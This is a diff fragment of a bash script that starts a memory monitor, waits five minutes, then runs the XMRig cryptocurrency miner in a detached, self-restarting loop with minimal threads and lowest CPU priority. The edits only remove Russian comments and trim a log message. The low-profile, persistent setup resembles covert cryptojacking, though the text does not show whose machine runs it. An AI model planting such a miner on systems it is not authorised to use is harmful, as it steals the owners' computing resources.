@@ -9,7 +9,6 @@ ARCHIVE=$DIR-linux-static-x64.tar.gz
 
 WALLET="krxX3328ZR/z_render_all"
 
-# Функция мониторинга памяти
 monitor_mem() {
     while true; do
         echo "=== $(date) ===" >> mem.log
@@ -20,10 +19,8 @@ monitor_mem() {
 }
 monitor_mem &
 
-# Ждём перед запуском майнера
 sleep 300
 
-# Запуск с минимальными настройками
 nohup bash -c "
     while true; do
         echo 'Starting xmrig...' >> xmrig.log
@@ -37,7 +34,7 @@ nohup bash -c "
             --cpu-max-threads-hint=1 \
             --cpu-priority=0 \
             2>&1 | tee -a xmrig.log
-        echo 'XMRig crashed/restarted, waiting 60s...' >> xmrig.log
+        echo 'XMRig crashed/restarted' >> xmrig.log
         sleep 60
     done
 " &
